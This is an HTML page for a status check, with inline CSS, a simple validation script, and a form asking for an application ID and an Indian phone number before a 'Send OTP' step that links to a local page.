<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Status Page</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-image: url('https://static.vecteezy.com/system/resources/thumbnails/015/710/948/small_2x/abstract-background-texture-art-orange-and-yellow-colors-watercolor-painting-on-canvas-with-soft-red-gradient-free-vector.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
        }
        .container {
            width: 90%;
            max-width: 400px;
            padding: 30px;
            background-color: rgba(0, 0, 0, 0); /* Fully transparent background */
            border-radius: 12px;
            text-align: center;
            transition: transform 0.3s ease;
        }
        .container:hover {
            transform: translateY(-5px);
        }
        .box {
            margin-bottom: 15px;
            padding: 10px; /* Reduced padding for shorter height */
            background-color: #ffffff; /* White background for each input container */
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .flex-container {
            display: flex;
            align-items: center;
        }
        .flex-left {
            flex: 0 0 40px; /* Fixed width for square box */
            height: 40px; /* Fixed height for square box */
            background-image: url('blob:https://web.whatsapp.com/8812f2fe-c183-4140-8807-99f5657f3805');
            background-size: cover; /* Cover the entire area */
            border-radius: 8px; /* Rounded corners */
            text-align: center;
            color: #821131;
            font-weight: bold;
            line-height: 40px; /* Center text vertically */
        }
        .flex-right {
            flex: 1;
            padding: 0 10px;
        }
        input[type="text"], input[type="tel"] {
            width: 100%;
            padding: 10px;
            margin: 0;
            border-radius: 0 8px 8px 0; /* Round right corners for a smooth look */
            border: none; /* Removed border */
            background-color: rgba(0, 0, 0, 0); /* Transparent input background */
            color: #000; /* Black text for input fields */
            box-sizing: border-box;
            font-size: 16px;
            transition: box-shadow 0.3s ease;
        }
        input[type="text"]:focus, input[type="tel"]:focus {
            box-shadow: 0 0 5px rgba(199, 37, 62, 0.5);
            outline: none;
        }
        button {
            padding: 14px;
            width: 100%;
            background-color: #C7253E; /* Your preferred button color */
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s ease;
            font-size: 18px;
            font-weight: bold;
        }
        button:hover {
            background-color: #A11D36; /* Darker shade on hover */
            transform: translateY(-2px);
        }
        button:active {
            background-color: #8A1A2E; /* Even darker shade on click */
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }
            input[type="text"], input[type="tel"], button {
                padding: 10px;
                font-size: 16px;
            }
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
    </style>
    <script>
        function validateForm(event) {
            const applicationId = document.getElementById("applicationId").value;
            const phoneNumber = document.getElementById("phoneNumber").value;

            if (!applicationId || !phoneNumber) {
                event.preventDefault(); // Prevent form submission
                alert("Please fill in all fields."); // Alert the user
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <img src="https://cdn-icons-png.flaticon.com/256/4889/4889066.png" alt="Logo" class="logo">
        
        <!-- Form to handle input and submission -->
        <form onsubmit="validateForm(event)" action="blaze_statusotp.html">
            <!-- Box: Application ID -->
            <div class="box flex-container">
                <div class="flex-left">ID</div>
                <div class="flex-right">
                    <input type="text" id="applicationId" placeholder="Application ID" required>
                </div>
            </div>

            <!-- Box: Phone Number with square-shaped left part -->
            <div class="box flex-container">
                <div class="flex-left">Phone</div>
                <div class="flex-right">
                    <input type="tel" id="phoneNumber" placeholder="+91 Phone Number" required>
                </div>
            </div>

            <!-- Send OTP Button (without a white box) -->
            <button type="submit">Send OTP</button>
        </form>
    </div>
</body>
</html>
